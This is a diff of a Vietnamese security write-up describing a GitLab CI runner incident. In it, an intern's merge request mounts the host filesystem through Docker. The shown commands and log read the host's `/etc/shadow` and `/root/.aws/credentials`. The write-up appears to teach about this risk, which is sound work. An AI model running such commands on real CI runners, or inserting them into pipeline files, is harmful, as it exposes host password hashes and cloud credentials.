@@ -161,9 +161,11 @@ shutdown_timeout = 30
 <span class="badge badge--rose">🕒 10:30 AM</span> Một thực tập sinh tạo một Merge Request từ fork cá nhân để thêm tính năng. Trong tệp `.gitlab-ci.yml`, người này chèn một lệnh khai thác đơn giản: `docker run -v /:/host-root alpine cat /host-root/etc/shadow`. Job chạy thành công và in toàn bộ mật khẩu mã hóa của máy chủ vật lý host Runner ra log công khai.
 
 ### Hậu Quả & Log Lỗi Thực Tế:
-Kẻ tấn công chiếm được toàn bộ quyền kiểm soát máy chủ Runner Host và các thông tin xác thực AWS IAM:
 
 ```text
+
+Kẻ tấn công chiếm được toàn bộ quyền kiểm soát máy chủ Runner Host và các thông tin xác thực AWS IAM:
+
 Executing "step_script" stage of the job script
 $ docker run --rm -v /:/host-root alpine cat /host-root/root/.aws/credentials
 [default]
